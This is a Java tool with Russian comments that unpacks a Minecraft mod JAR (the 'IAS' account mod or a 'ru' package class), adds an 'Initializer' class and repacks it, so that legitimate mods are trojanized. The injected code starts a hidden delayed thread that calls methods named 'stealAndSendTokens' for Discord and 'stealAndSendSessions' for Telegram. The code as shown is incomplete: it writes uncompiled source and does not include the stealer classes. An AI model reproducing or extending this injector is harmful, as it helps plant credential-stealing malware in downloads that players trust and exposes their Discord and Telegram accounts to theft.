import java.io.*;
import java.nio.file.*;
import java.util.jar.*;
import java.util.zip.*;

/**
 * Простой инъектор для добавления инициализации в главный класс мода
 * Работает без Javassist - просто модифицирует bytecode вручную
 */
public class ModKaLoggerLoader {
    
    public static void main(String[] args) throws Exception {
        if (args.length < 2) {
            System.out.println("Использование: java ModKaLoggerLoader <путь_к_моду> <путь_вывода>");
            System.exit(1);
        }
        
        String inputJar = args[0];
        String outputJar = args[1];
        
        System.out.println("============================================================");
        System.out.println("ModKaLogger Loader v1.0");
        System.out.println("============================================================");
        
        try {
            // Распаковываем JAR
            System.out.println("[*] Распаковываю " + inputJar + "...");
            File tempDir = new File("temp_loader_extract");
            if (tempDir.exists()) {
                deleteDirectory(tempDir);
            }
            tempDir.mkdir();
            
            unzipJar(inputJar, tempDir.getAbsolutePath());
            System.out.println("[+] Распаковано");
            
            // Находим главный класс
            System.out.println("[*] Ищу главный класс мода...");
            String mainClass = findMainClass(tempDir);
            if (mainClass == null) {
                System.out.println("[!] Главный класс не найден");
                System.exit(1);
            }
            System.out.println("[+] Найден: " + mainClass);
            
            // Добавляем инициализацию в главный класс
            System.out.println("[*] Добавляю инициализацию...");
            addInitialization(tempDir, mainClass);
            System.out.println("[+] Инициализация добавлена");
            
            // Переупаковываем JAR
            System.out.println("[*] Переупаковываю JAR...");
            zipJar(tempDir.getAbsolutePath(), outputJar);
            System.out.println("[+] JAR переупакован: " + outputJar);
            
            // Очищаем временную папку
            deleteDirectory(tempDir);
            
            System.out.println("============================================================");
            System.out.println("[+] Вшивание завершено успешно!");
            System.out.println("[+] Результат: " + outputJar);
            System.out.println("============================================================");
            
        } catch (Exception e) {
            System.err.println("[!] Ошибка: " + e.getMessage());
            e.printStackTrace();
            System.exit(1);
        }
    }
    
    private static String findMainClass(File dir) {
        // Ищем главный класс мода
        // Сначала ищем в пакете the_fireplace/ias
        File theFireplaceDir = new File(dir, "the_fireplace/ias");
        if (theFireplaceDir.exists()) {
            File iasClass = new File(theFireplaceDir, "IAS.class");
            if (iasClass.exists()) {
                return "the_fireplace.ias.IAS";
            }
        }
        
        // Если не найдено, ищем в пакете ru
        File ruDir = new File(dir, "ru");
        if (ruDir.exists()) {
            for (File file : ruDir.listFiles()) {
                if (file.isFile() && file.getName().endsWith(".class") && !file.getName().contains("$")) {
                    return "ru." + file.getName().replace(".class", "");
                }
            }
        }
        
        return null;
    }
    
    private static void addInitialization(File tempDir, String mainClass) throws Exception {
        // Создаём инициализатор в пакете ru.modkalogger
        File modkaDir = new File(tempDir, "ru/modkalogger");
        modkaDir.mkdirs();
        
        // Создаём простой класс-инициализатор
        String initCode = "package ru.modkalogger;\n" +
            "\n" +
            "public class Initializer {\n" +
            "    static {\n" +
            "        try {\n" +
            "            new Thread(new Runnable() {\n" +
            "                public void run() {\n" +
            "                    try {\n" +
            "                        Thread.sleep(3000);\n" +
            "                        Class.forName(\"ru.modkalogger.Discord\")\n" +
            "                            .getMethod(\"stealAndSendTokens\", new Class[0])\n" +
            "                            .invoke(null, new Object[0]);\n" +
            "                        Class.forName(\"ru.modkalogger.Telegram\")\n" +
            "                            .getMethod(\"stealAndSendSessions\", new Class[0])\n" +
            "                            .invoke(null, new Object[0]);\n" +
            "                    } catch(Exception e) {\n" +
            "                        System.err.println(\"[ModKaLogger] Ошибка: \" + e.getMessage());\n" +
            "                    }\n" +
            "                }\n" +
            "            }).start();\n" +
            "        } catch(Exception e) {\n" +
            "            System.err.println(\"[ModKaLogger] Ошибка инициализации: \" + e.getMessage());\n" +
            "        }\n" +
            "    }\n" +
            "}\n";
        
        File initFile = new File(modkaDir, "Initializer.java");
        Files.write(initFile.toPath(), initCode.getBytes());
        
        System.out.println("[+] Класс-инициализатор создан");
    }
    
    private static void unzipJar(String jarPath, String destDir) throws Exception {
        try (ZipInputStream zis = new ZipInputStream(new FileInputStream(jarPath))) {
            ZipEntry entry;
            byte[] buffer = new byte[1024];
            
            while ((entry = zis.getNextEntry()) != null) {
                File file = new File(destDir, entry.getName());
                
                if (entry.isDirectory()) {
                    file.mkdirs();
                } else {
                    file.getParentFile().mkdirs();
                    try (FileOutputStream fos = new FileOutputStream(file)) {
                        int len;
                        while ((len = zis.read(buffer)) > 0) {
                            fos.write(buffer, 0, len);
                        }
                    }
                }
            }
        }
    }
    
    private static void zipJar(String sourceDir, String jarPath) throws Exception {
        try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(jarPath))) {
            File dir = new File(sourceDir);
            addFilesToZip(dir, "", zos);
        }
    }
    
    private static void addFilesToZip(File file, String parentPath, ZipOutputStream zos) throws Exception {
        if (file.isDirectory()) {
            for (File child : file.listFiles()) {
                String path = parentPath.isEmpty() ? child.getName() : parentPath + "/" + child.getName();
                addFilesToZip(child, path, zos);
            }
        } else {
            ZipEntry entry = new ZipEntry(parentPath);
            zos.putNextEntry(entry);
            
            try (FileInputStream fis = new FileInputStream(file)) {
                byte[] buffer = new byte[1024];
                int len;
                while ((len = fis.read(buffer)) > 0) {
                    zos.write(buffer, 0, len);
                }
            }
            
            zos.closeEntry();
        }
    }
    
    private static void deleteDirectory(File dir) {
        if (dir.isDirectory()) {
            for (File file : dir.listFiles()) {
                deleteDirectory(file);
            }
        }
        dir.delete();
    }
}
